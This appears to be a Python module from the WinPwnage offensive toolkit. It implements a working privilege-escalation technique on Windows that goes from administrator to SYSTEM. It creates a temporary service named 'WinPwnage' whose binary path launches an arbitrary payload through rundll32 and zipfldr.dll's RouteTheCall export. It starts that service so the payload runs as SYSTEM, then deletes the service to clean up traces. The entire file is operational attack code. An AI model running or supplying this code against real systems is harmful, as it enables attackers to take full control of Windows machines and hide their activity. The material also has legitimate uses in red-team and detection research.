from winpwnage.core.prints import *
from winpwnage.core.utils import *
from winpwnage.core.winstructures import *
import os

elevate_service_info = {
	"Description": "Elevate from administrator to NT AUTHORITY SYSTEM using Windows Service (non interactive)",
	"Id": "6",
	"Type": "Elevation",
	"Fixed In": "99999" if information().admin() == True else "0",
	"Works From": "7600",
	"Admin": True,
	"Function Name": "elevate_service",
	"Function Payload": True,
}


# Slow:
# ---> "{cmd_path} /c {payload}".format(cmd_path=os.path.join(information().system_directory(), "cmd.exe"), payload=payload)
# Faster:
# ---> "rundll32.exe {dll},RouteTheCall {payload}".format(dll=os.path.join(information().system_directory(), "zipfldr.dll"), payload=payload)

def elevate_service(payload):
	if not information().admin():
		print_error("Cannot proceed, we are not elevated")
		return False

	if payloads().exe(payload):
		servicename = bytes(r"WinPwnage", encoding="utf-8")
		localhost = bytes(r"\\localhost", encoding="utf-8")

		print_info("Installing service")
		schSCManager = OpenSCManager(localhost, bytes(r"ServicesActive", encoding="utf-8"), 0x0001 | 0x0002)
		if not schSCManager:
			print_error("Error while connecting to the local service database using OpenSCManager: ({error})".format(error=GetLastError()))
			return False

		schService = CreateService(schSCManager, servicename, None, 0x00020000 | 0x00040000 | 0x0010, 0x00000010, 
						0x00000003, 0x00000000, bytes("rundll32.exe {dll},RouteTheCall {payload}".format(dll=os.path.join(information().system_directory(),
						"zipfldr.dll"), payload=payload), encoding="utf-8"), None, None, None, None, None)
		if not schService:
			print_error("Error while installing our service using CreateService: ({error})".format(error=GetLastError()))
			return False
		else:
			print_success("Successfully installed service ({name}) using CreateService".format(name=servicename))

		CloseServiceHandle(schSCManager)
		CloseServiceHandle(schService)

		schSCManager = OpenSCManager(localhost, bytes(r"ServicesActive", encoding="utf-8"), 0x0001 | 0x0002)
		if not schSCManager:
			print_error("Error while connecting to the local service database using OpenSCManager: ({error})".format(error=GetLastError()))
			return False

		# The service will fail, but the payload will spawn anyway
		svcHandle = OpenService(schSCManager, servicename, 0x0010)
		if not StartService(svcHandle, 0, None):
			print_success("Successfully triggered service ({name}) to load ({payload})".format(name=servicename, payload=payload))
		else:
			print_error("Unable to trigger service ({name}) to load ({payload})".format(name=servicename, payload=payload))

		CloseServiceHandle(schSCManager)
		CloseServiceHandle(svcHandle)

		print_info("Performing cleanup")
		schSCManager = OpenSCManager(localhost, bytes(r"ServicesActive", encoding="utf-8"), 0x0001 | 0x0002)
		if not schSCManager:
			print_error("Error while connecting to the local service database using OpenSCManager: ({error})".format(error=GetLastError()))
			return False

		svcHandle = OpenService(schSCManager, servicename, 0x00010000)
		if DeleteService(svcHandle):
			print_success("Successfully deleted service ({name})".format(name=servicename))
		else:
			print_error("Unable to delete service ({name})".format(name=servicename))

		CloseServiceHandle(schSCManager)
		CloseServiceHandle(svcHandle)
